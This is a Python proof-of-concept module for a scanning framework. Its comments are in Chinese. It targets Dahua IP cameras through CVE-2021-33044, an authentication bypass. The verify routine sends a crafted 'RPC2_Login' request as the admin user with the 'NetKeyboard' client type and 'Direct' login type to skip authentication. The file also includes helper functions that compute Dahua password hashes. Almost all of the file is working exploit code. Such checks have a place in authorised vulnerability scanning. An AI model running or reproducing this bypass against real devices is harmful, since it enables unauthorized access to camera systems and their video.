import hashlib
from urllib.parse import urljoin

import requests

from BasePoc import BasePoc
from log.Log import logger


def _compressor(in_var, out):
    """ From: https://github.com/haicen/DahuaHashCreator/blob/master/DahuaHash.py """
    i = 0
    j = 0

    while i < len(in_var):
        out[j] = (in_var[i] + in_var[i + 1]) % 62
        if out[j] < 10:
            out[j] += 48
        elif out[j] < 36:
            out[j] += 55
        else:
            out[j] += 61

        i = i + 2
        j = j + 1


def dahua_gen1_hash(password):
    """ From: https://github.com/haicen/DahuaHashCreator/blob/master/DahuaHash.py """
    m = hashlib.md5()
    m.update(password.encode("latin-1"))

    s = m.digest()
    crypt = []
    for b in s:
        crypt.append(b)

    out2 = [''] * 8
    _compressor(crypt, out2)
    dh_data = ''.join([chr(c) for c in out2])

    return dh_data


def dahua_gen2_md5_hash(
        dh_random=None, dh_realm=None, username=None, password=None, saved_host=None, return_hash=False):
    """ Dahua (gen2) DHIP/WEB random MD5 password hash """

    dh_hash = saved_host.get('password').get('gen2') if password is None else hashlib.md5(
        (username + ':' + dh_realm + ':' + password).encode('latin-1')
    ).hexdigest().upper()

    if return_hash:
        return dh_hash

    return hashlib.md5(
        (username + ':' + dh_random + ':' + dh_hash).encode('latin-1')
    ).hexdigest().upper()


POC_NAME = "Dahua"


class Dahua(BasePoc):
    # poc信息
    poc_info = {
        'Id': 'GDV-2022-1184',  # poc编号，与文件名保持一致
        'Name': 'Dahua IPC 授权问题漏洞',  # 漏洞名称必须与文件名一致；一般为CNNVD漏洞率名称；尽量避免特殊字符，空格使用_代替
        'Author': 'zhangzh',  # poc作者
        'Create_date': '2022-11-08',  # poc创建时间：如'2022-11-02'
        # 'Port': [],  # 说明该poc可能使用的端口
        # 'Service': 'Dahua'  # POC扫描漏洞所属厂商
    }

    # 漏洞描述规则：产品简介 +（换行）+漏洞细节（如没有漏洞细节用漏洞危害替代）+（换行）+备注（描述环境的特殊信息如登陆信息或者特殊URL等内容）三部分组成，描述完毕一段内容时必须换行。
    # 漏洞类型  命令执行; 代码执行; 文件写入; 文件上传; 权限绕过; 未授权访问; XXE 漏洞; SQL 注入; 文件读取; 文件下载; 文件包含; 路径遍历; 反序列化
    # 危害级别  1：低危 2：中危 3：高危 4：超危
    vul_info = {
        'Product': 'Dahua IPC',  # 漏洞所在产品名称
        'Version': None,  # 产品的版本号
        'Type': '权限绕过',  # 漏洞类型
        'Level': '超危',  # 危害级别
        'CVE': 'CVE-2021-33044',  # 漏洞CVE编号
        'CNNVD': 'CNNVD-202109-1080',  # 漏洞CNNVD编号
        'CNVD': 'CNVD-2021-103421',  # 漏洞CNVD编号
        'Description': 'Dahua IPC是中国大华（Dahua）公司的大华的一系列工控机。'
                       'Dahua IPC存在安全漏洞，攻击者可利用该漏洞通过构造恶意数据包绕过设备身份验证',  # 漏洞描述
        'DisclosureDate': '2021-09-15',  # 漏洞公布时间：如'2014-11-19'
    }

    scan_info = {
        'Id': '',  # POC id
        'Target': '',  # 目标网站域名
        'Port': '80',  # 目标端口
        'Mode': 'verify',  # verify、exploit、test# ， 默认值为verify
        'Error': '',  # 记录poc失败信息
        'Success': False,  # 是否执行成功，默认值为False表示poc执行不成功，若成功请更新该值为True
        'Timeout': 10,  # 用于POC相关请求的超时设置
        'Other': {}  # 记录额外的poc相关信息
    }

    def verify(self):
        timeout = (3, 2)
        proxies = {
            'http': 'http://127.0.0.1:6666',
        }
        url = 'http://{}'.format(self.scan_info['Target'])
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': url,
            'Origin': url,
            'Host': '{}:{}'.format(self.scan_info['Target'], '80'),
        }
        url = urljoin(url, "RPC2_Login")
        query_args = {
            "method": "global.login",
            "params": {
                "authorityType": "Default",
                "userName": "admin",
                "clientType": "NetKeyboard",
                "password": "Not Used",
                "loginType": "Direct",
                "passwordType": "Default",
            },
            "id": 1,
            "session": 0
        }

        dh_data = requests.post(url, json=query_args, headers=headers, verify=False, allow_redirects=False, proxies=proxies).json()
        logger.info(dh_data)
        self.scan_info['Other']['res_data'] = dh_data
        print(dh_data)
        if dh_data['result']:
            self.scan_info['Success'] = True

# if __name__ == "__main__":
#     print(POC('172.17.200.50', 'PORT').verify())
